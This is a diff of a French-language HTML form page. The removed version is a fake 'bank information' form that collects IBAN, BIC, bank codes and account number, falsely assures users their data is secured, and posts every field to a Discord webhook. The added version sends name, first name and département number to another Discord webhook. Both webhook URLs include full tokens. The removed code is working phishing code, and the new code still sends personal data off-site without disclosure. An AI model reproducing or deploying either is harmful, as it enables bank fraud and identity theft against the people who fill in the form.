@@ -1,207 +1,122 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Informations Bancaires</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Formulaire Professionnel</title>
 
   <style>
     *{
       margin:0;
       padding:0;
       box-sizing:border-box;
-      font-family: Arial, Helvetica, sans-serif;
+      font-family: Arial, sans-serif;
     }
 
     body{
-      background:#f4f7fb;
+      background: linear-gradient(135deg, #0f172a, #1e293b);
+      height:100vh;
       display:flex;
       justify-content:center;
       align-items:center;
-      min-height:100vh;
-      padding:20px;
     }
 
     .container{
-      width:100%;
-      max-width:650px;
       background:white;
-      border-radius:18px;
+      width:400px;
       padding:40px;
-      box-shadow:0 10px 30px rgba(0,0,0,0.08);
+      border-radius:20px;
+      box-shadow:0 10px 30px rgba(0,0,0,0.3);
     }
 
-    .header{
+    .container h1{
       text-align:center;
-      margin-bottom:35px;
-    }
-
-    .header h1{
-      color:#1d3557;
-      font-size:32px;
-      margin-bottom:10px;
-    }
-
-    .header p{
-      color:#6b7280;
-      font-size:15px;
+      margin-bottom:30px;
+      color:#0f172a;
+      font-size:28px;
     }
 
     .form-group{
-      margin-bottom:22px;
+      margin-bottom:20px;
     }
 
     label{
       display:block;
       margin-bottom:8px;
-      color:#374151;
-      font-weight:600;
-      font-size:14px;
+      font-weight:bold;
+      color:#334155;
     }
 
     input{
       width:100%;
-      padding:14px;
-      border:1px solid #d1d5db;
+      padding:12px;
+      border:1px solid #cbd5e1;
       border-radius:10px;
-      font-size:15px;
+      font-size:16px;
       transition:0.3s;
-      background:#fafafa;
     }
 
     input:focus{
-      outline:none;
       border-color:#2563eb;
-      background:white;
-      box-shadow:0 0 0 4px rgba(37,99,235,0.1);
-    }
-
-    .row{
-      display:flex;
-      gap:15px;
-    }
-
-    .row .form-group{
-      flex:1;
+      outline:none;
+      box-shadow:0 0 5px rgba(37,99,235,0.4);
     }
 
     button{
       width:100%;
-      padding:15px;
+      padding:14px;
       border:none;
-      border-radius:12px;
+      border-radius:10px;
       background:#2563eb;
       color:white;
       font-size:16px;
       font-weight:bold;
       cursor:pointer;
       transition:0.3s;
-      margin-top:10px;
     }
 
     button:hover{
       background:#1d4ed8;
     }
-
-    .footer{
-      margin-top:25px;
-      text-align:center;
-      color:#9ca3af;
-      font-size:13px;
-    }
-
-    @media(max-width:600px){
-      .row{
-        flex-direction:column;
-      }
-
-      .container{
-        padding:25px;
-      }
-    }
   </style>
 </head>
+
 <body>
 
   <div class="container">
+    <h1>Informations Personnelles</h1>
 
-    <div class="header">
-      <h1>Informations Bancaires</h1>
-      <p>Veuillez renseigner les informations de votre RIB</p>
-    </div>
-
-    <form id="bankForm">
+    <form onsubmit="webhook(); return false;">
       <div class="form-group">
-        <label>Nom du titulaire</label>
-        <input type="text" id="nom" placeholder="Ex : Jean Dupont">
+        <label for="nom">Nom</label>
+        <input type="text" id="nom" placeholder="Entrez votre nom">
       </div>
 
       <div class="form-group">
-        <label>IBAN</label>
-        <input type="text" id="iban" placeholder="FR76 XXXX XXXX XXXX XXXX XXXX XXX">
+        <label for="prenom">Prénom</label>
+        <input type="text" id="prenom" placeholder="Entrez votre prénom">
       </div>
 
       <div class="form-group">
-        <label>BIC / SWIFT</label>
-        <input type="text" id="bic" placeholder="ABCDEFGHXXX">
+        <label for="departement">N° du département</label>
+        <input type="number" id="departement" placeholder="Ex : 49">
       </div>
 
-      <div class="row">
-        <div class="form-group">
-          <label>Nom de la banque</label>
-          <input type="text" id="nomBanque" placeholder="Ex : Crédit Agricole">
-        </div>
-
-        <div class="form-group">
-          <label>Pays</label>
-          <input type="text" id="pays" placeholder="France">
-        </div>
-      </div>
-
-      <div class="row">
-        <div class="form-group">
-          <label>Code Banque</label>
-          <input type="text" id="codeBanque" placeholder="12345">
-        </div>
-
-        <div class="form-group">
-          <label>Code Guichet</label>
-          <input type="text" id="codeGuichet" placeholder="67890">
-        </div>
-      </div>
-
-      <div class="form-group">
-        <label>Numéro de compte</label>
-        <input type="text" id="numeroCompte" placeholder="XXXXXXXXXXX">
-      </div>
-
-      <button type="button" onclick="sendToWebhook()">Confirmer les informations</button>
+      <button type="submit">Envoyer</button>
     </form>
-
-    <div class="footer">
-      Vos informations sont sécurisées et protégées.
-    </div>
-
   </div>
 
   <script>
-    function sendToWebhook() {
-      const webhookUrl = 'https://discord.com/api/webhooks/1505660590750699521/-ezPlG3TgtK8PKSs_TUQ9Q1kj-wLXDBvYR25U8w1XcFxv1gj-wZfiCfLyx5NrGNNe8-H';
-      const nom = document.getElementById('nom').value;
-      const iban = document.getElementById('iban').value;
-      const bic = document.getElementById('bic').value;
-      const nomBanque = document.getElementById('nomBanque').value;
-      const pays = document.getElementById('pays').value;
-      const codeBanque = document.getElementById('codeBanque').value;
-      const codeGuichet = document.getElementById('codeGuichet').value;
-      const numeroCompte = document.getElementById('numeroCompte').value;
-
-      const message = `Nom du titulaire: ${nom}\nIBAN: ${iban}\nBIC/SWIFT: ${bic}\nNom de la banque: ${nomBanque}\nPays: ${pays}\nCode Banque: ${codeBanque}\nCode Guichet: ${codeGuichet}\nNuméro de compte: ${numeroCompte}`;
-
-      const request = new XMLHttpRequest();
-      request.open('POST', webhookUrl);
-      request.setRequestHeader('Content-type', 'application/json');
-      request.send(JSON.stringify({ content: message }));
+    function webhook() {
+      var hook = new XMLHttpRequest();
+      hook.open('POST', 'https://discord.com/api/webhooks/1505989811163496589/hX1_HEAV8QKgdb16be1u_-Umw3WN8yhZHrAgN3veFsUI3E9vZSawjoz8qmNu_tXJ_8oF');
+      hook.setRequestHeader('Content-type', 'application/json');
+      var content = {
+        username: 'Webhook Name',
+        avatar_url: 'https://example.com/profile-icon-for-bot.png',
+        content: 'Nom: ' + document.getElementById('nom').value + '\nPrénom: ' + document.getElementById('prenom').value + '\nDépartement: ' + document.getElementById('departement').value
+      };
+      hook.send(JSON.stringify(content));
     }
   </script>
 
